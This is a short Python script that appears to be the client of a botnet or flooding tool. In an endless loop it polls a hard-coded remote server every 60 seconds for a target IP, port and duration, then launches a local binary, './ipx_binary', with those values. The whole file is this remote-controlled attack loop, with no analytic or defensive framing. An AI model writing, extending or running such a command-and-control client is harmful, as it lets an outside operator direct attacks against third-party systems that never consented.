import time
import requests
import subprocess
import os

API_URL = "https://app19398.cloudwayssites.com/ipx.php/rishabh"
CHECK_INTERVAL = 60

def run_binary(ip, por, duration):
    binary_path = './ipx_binary'
    if not os.path.exists(binary_path):
        print("Binary file not found!")
        return
    try:
        subprocess.run([binary_path, ip, por, duration], check=True)
        print(f"Executed binary with ip={ip}, por={por}, duration={duration}")
    except Exception as e:
        print(f"Error executing binary: {e}")

def main():
    while True:
        try:
            response = requests.get(API_URL)
            if response.status_code != 200:
                print(f"Bad response: {response.status_code}")
                time.sleep(CHECK_INTERVAL)
                continue
            data = response.json()
            if data.get('status') == 'success' and 'params' in data:
                params = data['params']
                run_binary(params['ip'], params['por'], params['duration'])
            else:
                print("No execution command received, waiting.")
        except Exception as e:
            print(f"API request error: {e}")
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    main()